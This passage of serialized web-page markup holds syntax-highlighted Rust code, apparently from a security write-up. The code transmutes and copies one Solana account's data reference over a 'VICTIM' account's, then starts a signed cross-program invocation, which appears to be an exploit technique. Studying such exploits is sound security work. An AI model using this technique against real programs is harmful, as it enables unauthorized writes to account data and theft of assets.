react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[38]}]\na76:[\"$\",\"span\",\"code-segment-221\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\na77:[\"$\",\"span\",\"code-segment-222\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"ptr\"]}]\na78:[\"$\",\"span\",\"code-segment-223\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\na79:[\"$\",\"span\",\"code-segment-224\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"copy\"]}]\na7a:[\"$\",\"span\",\"code-segment-225\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\na7b:[\"$\",\"span\",\"code-segment-226\",{\"className\":\"$undefined\",\"style\":{},\"childre"])</script><script>self.__next_f.push([1,"n\":[\"\\n\"]}]\na7c:[\"$\",\"span\",\"line-number--39\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[39]}]\na7d:[\"$\",\"span\",\"code-segment-228\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\na7e:[\"$\",\"span\",\"code-segment-229\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"mem\"]}]\na7f:[\"$\",\"span\",\"code-segment-230\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\na80:[\"$\",\"span\",\"code-segment-231\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"transmute\"]}]\na81:[\"$\",\"span\",\"code-segment-232\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\na82:[\"$\",\"span\",\"code-segment-233\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\na83:[\"$\",\"span\",\"code-segment-234\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\na84:[\"$\",\"span\",\"code-segment-235\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}]\na85:[\"$\",\"span\",\"code-segment-236\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\na86:[\"$\",\"span\",\"code-segment-237\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}]\na87:[\"$\",\"span\",\"code-segment-238\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\na88:[\"$\",\"span\",\"code-segment-239\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\na89:[\"$\",\"span\",\"code-segment-240\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\na8a:[\"$\",\"span\",\"code-segment-241\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\na8b:[\"$\",\"span\",\"code-segment-242\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\na8c:[\"$\",\"span\",\"code-segment-243\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\""])</script><script>self.__next_f.push([1,":[\"u8\"]}]\na8d:[\"$\",\"span\",\"code-segment-244\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\na8e:[\"$\",\"span\",\"code-segment-245\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}]\na8f:[\"$\",\"span\",\"code-segment-246\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\na90:[\"$\",\"span\",\"code-segment-247\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\na91:[\"$\",\"span\",\"code-segment-248\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\na92:[\"$\",\"span\",\"code-segment-249\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}]\na93:[\"$\",\"span\",\"code-segment-250\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\na94:[\"$\",\"span\",\"code-segment-251\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\na95:[\"$\",\"span\",\"code-segment-252\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\na96:[\"$\",\"span\",\"code-segment-253\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\na97:[\"$\",\"span\",\"code-segment-254\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\na98:[\"$\",\"span\",\"line-number--40\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[40]}]\na99:[\"$\",\"span\",\"code-segment-256\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\na9a:[\"$\",\"span\",\"code-segment-257\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\na9b:[\"$\",\"span\",\"code-segment-258\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}]\na9c:[\"$\",\"span\",\"code-segment-259\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\na9d:[\"$\",\"span\",\"code-segment-260\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}]\na9e:[\"$\",\"span\",\"code-segment-261\",{\"className\":\"toke"])</script><script>self.__next_f.push([1,"n token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\na9f:[\"$\",\"span\",\"code-segment-262\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\naa0:[\"$\",\"span\",\"code-segment-263\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data \"]}]\naa1:[\"$\",\"span\",\"code-segment-264\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"//LEVERAGE\"]}]\naa2:[\"$\",\"span\",\"code-segment-265\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\naa3:[\"$\",\"span\",\"line-number--41\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[41]}]\naa4:[\"$\",\"span\",\"code-segment-267\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\naa5:[\"$\",\"span\",\"code-segment-268\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\naa6:[\"$\",\"span\",\"code-segment-269\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\naa7:[\"$\",\"span\",\"code-segment-270\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\naa8:[\"$\",\"span\",\"line-number--42\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[42]}]\naa9:[\"$\",\"span\",\"code-segment-272\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\naaa:[\"$\",\"span\",\"code-segment-273\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"mem\"]}]\naab:[\"$\",\"span\",\"code-segment-274\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\naac:[\"$\",\"span\",\"code-segment-275\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"transmute\"]}]\naad:[\"$\",\"span\",\"code-segment-276\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\naae:[\"$\",\""])</script><script>self.__next_f.push([1,"span\",\"code-segment-277\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\naaf:[\"$\",\"span\",\"line-number--43\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[43]}]\nab0:[\"$\",\"span\",\"code-segment-279\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\nab1:[\"$\",\"span\",\"code-segment-280\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"mem\"]}]\nab2:[\"$\",\"span\",\"code-segment-281\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nab3:[\"$\",\"span\",\"code-segment-282\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"transmute\"]}]\nab4:[\"$\",\"span\",\"code-segment-283\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nab5:[\"$\",\"span\",\"code-segment-284\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\nab6:[\"$\",\"span\",\"code-segment-285\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\nab7:[\"$\",\"span\",\"code-segment-286\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}]\nab8:[\"$\",\"span\",\"code-segment-287\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\nab9:[\"$\",\"span\",\"code-segment-288\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}]\naba:[\"$\",\"span\",\"code-segment-289\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\nabb:[\"$\",\"span\",\"code-segment-290\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\nabc:[\"$\",\"span\",\"code-segment-291\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\nabd:[\"$\",\"span\",\"code-segment-292\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nabe:[\"$\",\"span\",\"code-segment-293\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nabf:[\"$\",\"span\",\"code-segm"])</script><script>self.__next_f.push([1,"ent-294\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\nac0:[\"$\",\"span\",\"code-segment-295\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nac1:[\"$\",\"span\",\"code-segment-296\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}]\nac2:[\"$\",\"span\",\"code-segment-297\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nac3:[\"$\",\"span\",\"code-segment-298\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nac4:[\"$\",\"span\",\"code-segment-299\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\nac5:[\"$\",\"span\",\"code-segment-300\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}]\nac6:[\"$\",\"span\",\"code-segment-301\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nac7:[\"$\",\"span\",\"code-segment-302\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\nac8:[\"$\",\"span\",\"code-segment-303\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\nac9:[\"$\",\"span\",\"code-segment-304\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\naca:[\"$\",\"span\",\"code-segment-305\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nacb:[\"$\",\"span\",\"line-number--44\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[44]}]\nacc:[\"$\",\"span\",\"code-segment-307\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}]\nacd:[\"$\",\"span\",\"code-segment-308\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\nace:[\"$\",\"span\",\"code-segment-309\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}]\nacf:[\"$\",\"span\",\"code-segment-310\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nad0:[\"$\",\"span\",\"code-segment-311\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08"])</script><script>self.__next_f.push([1,"d49\"},\"children\":[\"1\"]}]\nad1:[\"$\",\"span\",\"code-segment-312\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nad2:[\"$\",\"span\",\"code-segment-313\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nad3:[\"$\",\"span\",\"code-segment-314\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data \"]}]\nad4:[\"$\",\"span\",\"code-segment-315\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"//VICTIM\"]}]\nad5:[\"$\",\"span\",\"code-segment-316\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nad6:[\"$\",\"span\",\"line-number--45\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[45]}]\nad7:[\"$\",\"span\",\"code-segment-318\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\nad8:[\"$\",\"span\",\"code-segment-319\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nad9:[\"$\",\"span\",\"code-segment-320\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nada:[\"$\",\"span\",\"line-number--46\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[46]}]\nadb:[\"$\",\"span\",\"code-segment-322\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\nadc:[\"$\",\"span\",\"code-segment-323\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nadd:[\"$\",\"span\",\"code-segment-324\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nade:[\"$\",\"span\",\"code-segment-325\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nadf:[\"$\",\"span\",\"line-number--47\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\""])</script><script>self.__next_f.push([1,"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[47]}]\nae0:[\"$\",\"span\",\"code-segment-327\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\nae1:[\"$\",\"span\",\"code-segment-328\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"mem\"]}]\nae2:[\"$\",\"span\",\"code-segment-329\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nae3:[\"$\",\"span\",\"code-segment-330\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"size_of\"]}]\nae4:[\"$\",\"span\",\"code-segment-331\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nae5:[\"$\",\"span\",\"code-segment-332\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\nae6:[\"$\",\"span\",\"code-segment-333\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}]\nae7:[\"$\",\"span\",\"code-segment-334\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\nae8:[\"$\",\"span\",\"code-segment-335\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}]\nae9:[\"$\",\"span\",\"code-segment-336\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\naea:[\"$\",\"span\",\"code-segment-337\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\naeb:[\"$\",\"span\",\"code-segment-338\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\naec:[\"$\",\"span\",\"code-segment-339\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\naed:[\"$\",\"span\",\"code-segment-340\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\naee:[\"$\",\"span\",\"code-segment-341\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\naef:[\"$\",\"span\",\"code-segment-342\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\naf0:[\"$\",\"span\",\"code-segment-343\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}]\naf1:[\"$\",\"span\",\"code-segment-344\",{\"className\":\"token token\",\"style\":"])</script><script>self.__next_f.push([1,"{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\naf2:[\"$\",\"span\",\"code-segment-345\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\naf3:[\"$\",\"span\",\"code-segment-346\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\naf4:[\"$\",\"span\",\"code-segment-347\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\naf5:[\"$\",\"span\",\"line-number--48\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[48]}]\naf6:[\"$\",\"span\",\"code-segment-349\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\naf7:[\"$\",\"span\",\"code-segment-350\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\naf8:[\"$\",\"span\",\"code-segment-351\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\naf9:[\"$\",\"span\",\"code-segment-352\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nafa:[\"$\",\"span\",\"line-number--49\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[49]}]\nafb:[\"$\",\"span\",\"code-segment-354\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\nafc:[\"$\",\"span\",\"code-segment-355\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\nafd:[\"$\",\"span\",\"code-segment-356\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nafe:[\"$\",\"span\",\"line-number--50\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[50]}]\naff:[\"$\",\"span\",\"code-segment-358\",{\"className\":\"$undefined\",\"style\":"])</script><script>self.__next_f.push([1,"{},\"children\":[\"    \"]}]\nb00:[\"$\",\"span\",\"code-segment-359\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"invoke_signed\"]}]\nb01:[\"$\",\"span\",\"code-segment-360\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nb02:[\"$\",\"span\",\"code-segment-361\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nb03:[\"$\",\"span\",\"line-number--51\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[51]}]\nb04:[\"$\",\"span\",\"code-segment-363\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\nb05:[\"$\",\"span\",\"code-segment-364\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\nb06:[\"$\",\"span\",\"code-segment-365\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Instruction\"]}]\nb07:[\"$\",\"span\",\"code-segment-366\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nb08:[\"$\",\"span\",\"code-segment-367\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"new_with_bincode\"]}]\nb09:[\"$\",\"span\",\"code-segment-368\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nb0a:[\"$\",\"span\",\"code-segment-369\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nb0b:[\"$\",\"span\",\"line-number--52\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[52]}]\nb0c:[\"$\",\"span\",\"code-segment-371\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            accounts\"]}]\nb0d:[\"$\",\"span\",\"code-segment-372\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nb0e:[\"$\",\"span\",\"code-segment-373\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"2\""])</script><script>self.__next_f.push([1,"]}]\nb0f:[\"$\",\"span\",\"code-segment-374\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nb10:[\"$\",\"span\",\"code-segment-375\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nb11:[\"$\",\"span\",\"code-segment-376\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"key\"]}]\nb12:[\"$\",\"span\",\"code-segment-377\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nb13:[\"$\",\"span\",\"code-segment-378\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"clone\"]}]\nb14:[\"$\",\"span\",\"code-segment-379\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nb15:[\"$\",\"span\",\"code-segment-380\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nb16:[\"$\",\"span\",\"code-segment-381\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nb17:[\"$\",\"span\",\"code-segment-382\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nb18:[\"$\",\"span\",\"line-number--53\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[53]}]\nb19:[\"$\",\"span\",\"code-segment-384\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\nb1a:[\"$\",\"span\",\"code-segment-385\",{\"className\":\"token token\",\"style\":{\"color\":\"#7ec699\"},\"children\":[\"b\\\"\\\"\"]}]\nb1b:[\"$\",\"span\",\"code-segment-386\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nb1c:[\"$\",\"span\",\"code-segment-387\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nb1d:[\"$\",\"span\",\"line-number--54\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[54]}]\nb1e:[\"$\",\"span\",\"code-segment-389\",{\"className\":\"$undefined\",\"style\":"])</script><script>self.__next_f.push([1,"{},\"children\":[\"            \"]}]\nb1f:[\"$\",\"span\",\"code-segment-390\",{\"className\":\"token token macro\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"vec!\"]}]\nb20:[\"$\",\"span\",\"code-segment-391\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nb21:[\"$\",\"span\",\"code-segment-392\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nb22:[\"$\",\"span\",\"line-number--55\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[55]}]\nb23:[\"$\",\"span\",\"code-segment-394\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\nb24:[\"$\",\"span\",\"code-segment-395\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountMeta\"]}]\nb25:[\"$\",\"span\",\"code-segment-396\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nb26:[\"$\",\"span\",\"code-segment-397\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"new\"]}]\nb27:[\"$\",\"span\",\"code-segment-398\",{\"className\":\"token 